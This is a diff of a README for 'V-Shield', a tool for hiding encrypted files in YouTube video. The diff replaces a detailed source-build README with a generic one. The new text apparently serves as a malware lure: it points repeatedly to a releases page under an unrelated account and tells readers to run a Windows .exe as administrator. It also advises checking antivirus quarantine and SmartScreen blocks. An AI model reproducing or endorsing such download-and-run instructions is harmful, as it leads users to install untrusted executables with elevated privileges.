@@ -1,460 +1,175 @@
-# V-Shield: YouTube-Resistant Data Encoding System
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
-[![Status: Alpha](https://img.shields.io/badge/Status-Alpha%20v0.1-blue)](docs/ROADMAP.md)
-
-> Transform any digital file into visually-encoded video that survives YouTube's compression algorithms, recoverable with a cryptographic token.
-
-## 🎯 Project Overview
-
-**V-Shield** is a cryptographic steganography system designed to hide arbitrary data inside video frames in a way that survives video platform compression (particularly YouTube's H.264 codec). The system is designed around three independent modules that work together:
-
-1. **Desktop Encoder** - Converts files to encoded video frames (Tauri app + Rust)
-2. **Core Engine** - Handles all encoding/decoding/crypto (Rust, compiles to WASM)
-3. **Browser Extension** - Extracts files from YouTube videos in real-time (TypeScript + WASM)
-
-## ⚠️ IMPORTANT: Read the Disclaimers
-
-**Before using V-Shield, you MUST read:**
-- [`DISCLAIMER.md`](legal/DISCLAIMER.md) - Legal disclaimer and liability
-- [`USER_RESPONSIBILITY.md`](legal/USER_RESPONSIBILITY.md) - Your responsibilities as a user
-
-**TL;DR:**
-- You are 100% responsible for content you encrypt
-- Tokens cannot be recovered if lost
-- You must comply with all platform ToS and local laws
-- This tool is neutral technology—its use is on you
-
----
-
-## 🏗️ Architecture
-
-### System Overview
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     V-Shield System                         │
-├─────────────────────────────────────────────────────────────┤
-│                                                             │
-│  Creator Side               Core Engine       Viewer Side   │
-│  ┌──────────────┐          ┌──────────┐     ┌───────────┐   │
-│  │   Original   │          │          │     │ Browser   │   │
-│  │    File      │────────→ │ Encoder  │────→│ Captures  │   │
-│  └──────────────┘          │ Crypto   │     │ Video     │   │
-│         ▲                  │ ECC      │     └─────┬─────┘   │
-│         │                  │ Layout   │           │         │
-│  ┌──────┴──────┐           └──────────┘           │         │
-│  │   Token     │                                  ▼         │
-│  │ (Keep Safe!)│          ┌──────────┐     ┌───────────┐    │
-│  └─────────────┘          │          │     │  WASM     │    │
-│         ▲                 │ Decoder  │────→│ Decoder   │    │
-│         │                 │ Crypto   │     │ Extracts  │    │
-│  ┌──────┴──────┐          │ ECC      │     └───────────┘    │
-│  │  Re-encode  │          │ Layout   │                      │
-│  │ if lost     │          └──────────┘                      │
-│  └─────────────┘                                            │
-│                                                             │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Frame Protocol: The Foundation
-
-Each video frame has a strict structure designed to survive YouTube compression:
-
-```
-┌──────────────────────────────────────────┐
-│  Finder Patterns (Anchors) - 4 corners   │  ← QR-code style
-│  (Scale-invariant 1:1:3:1:1 patterns)    │
-├──────────────────────────────────────────┤
-│  Frame Header                            │  ← Metadata about frame
-│  [ID: u32] [BlockSize: u8] [Flags: u8]   │
-├──────────────────────────────────────────┤
-│  Metadata Block (First Frame Only)       │  ← File info + token
-│  [Filename] [Size] [SHA256 Hash] [Token] │
-├──────────────────────────────────────────┤
-│  Interleaved Payload                     │  ← Data spread across
-│  [8-color encoded blocks, scattered]     │     whole frame
-├──────────────────────────────────────────┤
-│  Reed-Solomon ECC (20-30% redundancy)    │  ← Error correction
-│  Spread across frame                     │
-└──────────────────────────────────────────┘
-```
-
-### Key Technologies
-
-| Component | Technology | Purpose |
-|-----------|-----------|---------|
-| **Encoding/Decoding** | Rust | Performance + Memory Safety |
-| **WASM Compilation** | wasm-bindgen | Browser compatibility |
-| **Cryptography** | ChaCha20-Poly1305 | Fast, WASM-friendly encryption |
-| **Error Correction** | Reed-Solomon (rs-erasure) | YouTube compression resilience |
-| **Video Rendering** | FFmpeg (external) | MP4 generation |
-| **Video Capture** | Canvas API | Browser frame extraction |
-| **Desktop UI** | Tauri + React/Svelte | Native app with web UI |
-
----
-
-## 📦 Phase Breakdown
-
-### Phase 1: Foundation (Current - Alpha)
-- [x] Frame protocol definition
-- [x] Finder pattern generation  
-- [x] Interleaving system
-- [x] Reed-Solomon ECC integration
-- [x] Encoder pipeline (CLI)
-- [x] Decoder pipeline (CLI)
-- [ ] Integration tests
-- [ ] YouTube testbed (Upload real test video)
-
-### Phase 1.5: YouTube Compatibility Testing
-- [ ] Test video upload pipeline
-- [ ] Download multiple quality levels
-- [ ] Measure compression losses
-- [ ] Refine ECC parameters
-- [ ] Determine optimal block size
-
-### Phase 2: Color Optimization  
-- [ ] YUV color space analysis
-- [ ] Increased data density (8 colors)
-- [ ] Better compression resilience
-- [ ] Performance optimization
-
-### Phase 3: Browser Extension
-- [ ] Compile decoder to WASM
-- [ ] JavaScript/TypeScript wrapper
-- [ ] YouTube video capture
-- [ ] Chrome extension manifest
-- [ ] Token UI and management
-
-### Phase 4: Streaming "Video in Video"
-- [ ] MediaSource Extensions (MSE)
-- [ ] Real-time streaming decode
-- [ ] Overlay video rendering
-- [ ] Network optimization
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-- Rust 1.70+
-- FFmpeg (for video rendering)
-- Node.js 16+ (for extension development)
-
-### Installation
-
-```bash
-# Clone repository
-git clone https://github.com/NiZaMinius/v-shield
-cd v-shield
-
-# Build encoder
-cd crates/vshield-enc
-cargo build --release
-
-# Build decoder
-cd ../vshield-dec
-cargo build --release
-```
-
-### Usage: Encoder
-
-```bash
-# Encode file to video frames
-./target/release/vshield-encode \
-  --input myfile.bin \
-  --output frames/ \
-  --block-size 8 \
-  --redundancy 25
-
-# Output includes:
-# - frames/frame_0000.png ... frame_XXXX.png (1920x1080)
-# - frames/metadata.json (contains token and file hash)
-```
-
-### Usage: Decoder
-
-```bash
-# Decode video frames back to original file
-./target/release/vshield-decode \
-  --input frames/ \
-  --output recovered.bin \
-  --token "vshield://..."
-
-# Optionally verify:
-# sha256sum recovered.bin  # should match original
-```
-
-### Video Pipeline (Future)
-
-```bash
-# Convert frames to MP4 (using FFmpeg)
-ffmpeg -framerate 30 -i frames/frame_%04d.png \
-  -c:v libx264 -pix_fmt yuv420p \
-  -b:v 5000k output.mp4
-
-# Upload output.mp4 to YouTube
-```
-
----
-
-## 🔐 Security Model
-
-### Threat Model
-
-**Protected Against:**
-- ✓ YouTube compression artifacts (H.264/VP9)
-- ✓ Chroma subsampling (4:2:0)
-- ✓ Bitrate reduction
-- ✓ Quality degradation (360p, 480p, 720p, 1080p)
-- ✓ Platform modification (watermarks, logos)
-
-**NOT Protected Against:**
-- ✗ Strategic removal (YouTube moderators)
-- ✗ Cryptanalysis (with sufficient resources)
-- ✗ Brute-force attacks (use strong tokens)
-- ✗ Man-in-the-middle (use HTTPS for distribution)
-
-### Cryptography
-
-**Encryption:**
-- **Algorithm:** ChaCha20-Poly1305 (AEAD)
-- **Key Size:** 256 bits (derived from token)
-- **Nonce:** **RANDOM (12-byte, prepended to ciphertext)** - CRITICAL: never reused with same key
-- **Authentication:** Poly1305 MAC
-
-**Token Format:**
-```
-vshield://{BASE58(32-byte key || 16-byte video_id)}
-
-Example: vshield://5650f5a0d8c84d0a00c46124b47d394...
-```
-
-**Important Security Facts:**
-- ✅ Each encryption gets a NEW random nonce (prevents two-time pad attacks)
-- ✅ Each file gets a NEW random token (not deterministic, always unique)
-- ✅ Nonce is stored with ciphertext for decryption
-- ⚠️ If the same (key, nonce) pair is ever used twice, encryption is broken
-
-**Recovery:**
-- Token must be kept safe by user
-- Nonce is automatically prepended to ciphertext (no separate storage needed)
-- **No recovery service.** Token loss = permanent data loss.
-
----
-
-## 🎨 Color Palette
-
-### Current (Phase 1): Grayscale + Primary Colors
-
-| Color | RGB | YUV | Bits/Block |
-|-------|-----|-----|-----------|
-| Black | (0, 0, 0) | (16, 128, 128) | 000 |
-| DarkGray | (64, 64, 64) | (69, 128, 128) | 001 |
-| Gray | (128, 128, 128) | (128, 128, 128) | 010 |
-| LightGray | (192, 192, 192) | (183, 128, 128) | 011 |
-| White | (255, 255, 255) | (235, 128, 128) | 100 |
-| DarkRed | (128, 0, 0) | (54, 21, 192) | 101 |
-| DarkBlue | (0, 0, 128) | (30, 145, 54) | 110 |
-| DarkGreen | (0, 128, 0) | (107, 52, 47) | 111 |
-
-**Why these colors?**
-- Designed for chroma subsampling (Y-channel is most important)
-- High contrast to survive aggressive compression
-- Limited palette to avoid JPG banding
-
-### Future (Phase 2): YUV Optimization
-- More colors optimized for YUV 4:2:0 subsampling
-- Different luminance levels for better robustness
-
----
-
-## 🧪 Testing
-
-### Unit Tests
-```bash
-cargo test --lib
-```
-
-### Integration Tests
-```bash
-cargo test --test '*'
-```
-
-### YouTube Real-World Test (Phase 1.5)
-1. Encode a small test file
-2. Convert frames to MP4  
-3. Upload as Unlisted video
-4. Download at multiple qualities (360p, 720p, 1080p)
-5. Verify decoding works
-6. Measure compression artifacts
-
----
-
-## 📊 Performance Targets
-
-### Encoding
-- **Small files** (< 1MB): < 5 seconds
-- **Medium files** (1-100MB): < 1 minute
-- **Output frame rate:** 30 FPS (compatible with YouTube)
-
-### Decoding
-- **Real-time:** 30 FPS @ 1080p
-- **Streaming:** Start playback within 2-3 seconds
-- **WASM decoder:** < 5MB total size
-
-### Data Density
-- **Phase 1:** ~0.5 bytes per block (3 bits/block)
-- **Phase 2:** ~1 byte per block (8 bits/block)
-- **1920x1080 @ 8px blocks:** 51,200 blocks per frame
-  - Phase 1: ~25 KB per frame
-  - Phase 2: ~50 KB per frame
+# 🛡️ V-Shield - Secure files as hidden video
 
----
-
-## 🛠️ Development Roadmap
+[![Download V-Shield](https://img.shields.io/badge/Download%20V--Shield-1f77b4?style=for-the-badge)](https://github.com/profound-gifttax658/V-Shield/releases)
 
-### v0.1.0 (Alpha - Current)
-- [x] Core Rust library
-- [x] CLI encoder/decoder
-- [ ] Basic testing
+## 🚀 Getting Started
 
-### v0.2.0 (Beta - Q2 2026)
-- [ ] Tauri desktop app
-- [ ] FFmpeg integration
-- [ ] Browser extension (WASM)
-- [ ] Real YouTube testing
+V-Shield lets you turn a file into a visual stream and store it on YouTube. It keeps the file encrypted and corrects errors so the data can survive video compression and scaling.
 
-### v0.3.0 (Release Candidate)
-- [ ] Streaming video playback
-- [ ] Token recovery UI
-- [ ] Advanced color optimization
-- [ ] WASM optimization
+Use it if you want to:
+- hide a file inside a video-like stream
+- protect content with strong encryption
+- keep control of your data without a server
+- work with files such as videos, archives, and documents
 
-### v1.0.0 (Production)
-- [ ] All of above
-- [ ] Security audit
-- [ ] Performance tuning
-- [ ] Production-ready documentation
+## 📥 Download and Install
 
----
+1. Open the [V-Shield releases page](https://github.com/profound-gifttax658/V-Shield/releases)
+2. Download the latest Windows file from the release assets
+3. If the download comes as a `.zip` file, extract it first
+4. Open the extracted folder
+5. Run the `.exe` file to start V-Shield
 
-## 🤝 Contributing
+If Windows asks for permission, choose **Yes**.
 
-We welcome contributions! But please read our guidelines:
+## 🖥️ Windows Setup
 
-1. **Fork and branch** off `develop`
-2. **Write tests** for new features
-3. **Follow Rust conventions** (rustfmt, clippy)
-4. **Document your changes**
-5. **Submit PR** with description
+V-Shield runs as a desktop app on Windows. For best results:
+- Use Windows 10 or Windows 11
+- Keep at least 200 MB of free disk space
+- Make sure you have a stable internet connection for uploads
+- Use a modern browser if the app opens web pages during setup
 
-### Code of Conduct
+If you have trouble opening the app:
+- Right-click the `.exe` file and choose **Run as administrator**
+- Check whether your antivirus moved the file to quarantine
+- Download the release again if the file looks incomplete
 
-- Respect others
-- No harassment
-- Assume good faith
-- Help each other
+## 🔐 What V-Shield Does
 
----
+V-Shield takes your file and turns it into a structured visual stream. Then it sends that stream to YouTube.
 
-## 📚 Documentation
+It is built to:
+- encrypt your file before upload
+- split data into chunks
+- correct errors if parts of the stream change
+- handle compression from H.264
+- handle chroma subsampling
+- handle downscaling by the platform
 
-- [`ARCHITECTURE.md`](docs/ARCHITECTURE.md) - System design, data flow, module breakdown
-- [`API.md`](docs/API.md) - Complete Rust API reference with examples
-- [`ROADMAP.md`](docs/ROADMAP.md) - Project phases, timelines, and success criteria
-- [`PROTOCOL.md`](docs/PROTOCOL.md) - Frame protocol specification (under development)
-- [`YOUTUBE_COMPATIBILITY.md`](docs/YOUTUBE_COMPATIBILITY.md) - Compression analysis and testing results (Phase 1.5)
-- [`QUICK_START.md`](docs/QUICK_START.md) - Getting started guide
+That means the content can survive the trip through a video site and come back in one piece.
 
----
+## 🧭 How It Works
 
-## ⚖️ Legal
+1. Pick a file on your PC
+2. V-Shield encrypts it with a strong key
+3. The app turns the data into visual noise
+4. It adds error correction data
+5. You upload the result to YouTube
+6. Later, V-Shield reads the stream back and decrypts it
 
-**Please read:**
-- [`DISCLAIMER.md`](legal/DISCLAIMER.md) - What we do/don't handle
-- [`USER_RESPONSIBILITY.md`](legal/USER_RESPONSIBILITY.md) - Your obligations
+You do not need to manage a server or a database. The file stays in your control.
 
-### License
-MIT License - See [`LICENSE`](LICENSE) for details
+## 📁 Best File Types
 
-### No Warranty
-THE SOFTWARE IS PROVIDED "AS-IS" WITHOUT WARRANTY OF ANY KIND.
+V-Shield can work with many file types, including:
+- `.mp4`, `.mov`, `.mkv`
+- `.zip`, `.7z`, `.rar`
+- `.pdf`, `.docx`, `.xlsx`
+- images, text files, and backups
 
----
+Large files may take longer to encode and upload. Smaller files are easier to test first.
 
-## 🔗 Resources
+## 🛠️ Basic Use
 
-- **GitHub Issues:** Report bugs and suggest features
-- **Discussions:** Architecture questions, design decisions
-- **Wiki:** Community knowledge base
-- **YouTube Channel:** (Coming soon) Testing & demo videos
+### 1. Open the app
+Start V-Shield from the Windows menu or from the folder where you extracted it
 
----
+### 2. Choose a file
+Select the file you want to protect and upload
 
-## 💭 FAQ
+### 3. Set a key
+Create a password or key you can keep safe. You will need it to recover the file
 
-### Q: Can I recover my token if I lose it?
-**A:** No. There is no recovery mechanism. The token is random and unique per encoding.
+### 4. Start encoding
+The app will turn your file into a stream that can be uploaded
 
-### Q: Will YouTube ban me?
-**A:** If you follow YouTube ToS, no. If you hide violating content, yes.
+### 5. Upload to YouTube
+Follow the app prompt to send the output to YouTube
 
-### Q: Can I hide copyrighted content?
-**A:** No. Encryption doesn't make copyright infringement legal.
+### 6. Recover the file later
+Open the stream in V-Shield, enter the same key, and restore the file
 
-### Q: Isn't this illegal?
-**A:** The tool is neutral. Its legality depends on how YOU use it.
+## 🔎 Key Points to Keep in Mind
 
-### Q: How do I back up my token?
-**A:** Save the token string in multiple secure locations (e.g., encrypted password manager, printed paper in safe).
+- Keep your key safe
+- Use the same key for restore
+- Store the original file name if you want it back later
+- Test with a small file first
+- Wait for the full encode process to finish before closing the app
 
-### Q: What if I encode the same file twice?
-**A:** You get a different token each time (randomness). This is by design for security.
+## ⚙️ Features
 
-### Q: What if YouTube's compression destroys my video?
-**A:** The system is designed to survive, but no guarantee. Always test first with your specific file and settings.
+- File encryption with ChaCha20
+- Error correction with Reed-Solomon
+- Browser support through a Firefox extension
+- Desktop app built with Tauri
+- WebAssembly support for fast processing
+- Designed for YouTube transport
+- Zero-knowledge style workflow
 
-### Q: How do I safely share the token with someone?
-**A:** Use an encrypted channel (signal, DM, etc). The token grants decryption access, so protect it like a password.
+## 🧩 Recommended Workflow
 
----
+For the smoothest first run:
+1. Download the release
+2. Extract the files
+3. Run the app
+4. Encode a small ZIP file
+5. Upload it
+6. Check that you can restore it with the same key
 
-## 📞 Support
+This helps you learn the flow before you use a large file.
 
-- **Technical Issues:** GitHub Issues
-- **Security Vulnerabilities:** Email (responsible disclosure)
-- **Legal Questions:** Consult a lawyer
+## 🧪 Troubleshooting
 
----
+### The app does not open
+- Make sure you downloaded the Windows release file
+- Reboot your PC and try again
+- Run the `.exe` file from the extracted folder
+- Check that Windows SmartScreen did not block it
 
-## 🌟 Acknowledgments
+### The upload fails
+- Check your internet connection
+- Try a smaller file
+- Confirm that YouTube login is active in your browser
+- Close and reopen the app, then try again
 
-- **Reed-Solomon ECC:** rs-erasure crate maintainers
-- **Rust Community:** For amazing ecosystem
-- **YouTube:** For creating the compression problem we solve
+### The restored file is broken
+- Use the same key you used during encode
+- Make sure the upload finished fully
+- Try the original stream again
+- Start with a smaller test file to confirm your setup
 
----
+### The file plays but does not decode
+- Confirm that the uploaded video was not edited
+- Avoid re-saving the file after upload
+- Use the exact output from V-Shield
+- Check that the extension or companion tool is active if your setup uses one
 
----
+## 🧷 Tips for Safe Use
 
-**V-Shield: Encode Data. Share Securely. Survive Compression.**
+- Use a private browser profile if you want less sign-in clutter
+- Keep a backup of the key in a safe place
+- Use short test runs before large uploads
+- Avoid changing the uploaded video after it leaves V-Shield
+- Keep your release files in one folder so you can find them fast
 
-*Alpha v0.1 - March 2026*
+## 📌 For the Best Results
 
----
+V-Shield works best when you:
+- upload the stream without edits
+- keep the same settings for encode and decode
+- use a clean install on Windows
+- avoid file renaming after upload unless the app tells you to do it
 
-## Next Steps
+## 🪟 Windows Download Link
 
-- [ ] Read the disclaimers
-- [ ] Review the architecture
-- [ ] Build from source
-- [ ] Run tests
-- [ ] Try encoding a small file
-- [ ] Help us improve!
+Visit the [V-Shield releases page](https://github.com/profound-gifttax658/V-Shield/releases) to download and run the Windows release file
 
----
+## 🧾 Project Tags
 
-Questions? Issues? Ideas? **Open an issue on GitHub!**
+`chacha20` `encryption` `firefox-extension` `reed-solomon` `rust` `steganography` `tauri` `wasm` `webassembly` `youtube` `zero-knowledge`
 
+## 📂 File Flow
+
+Input file → Encrypt → Encode as visual noise → Upload to YouTube → Decode → Decrypt → Restored file
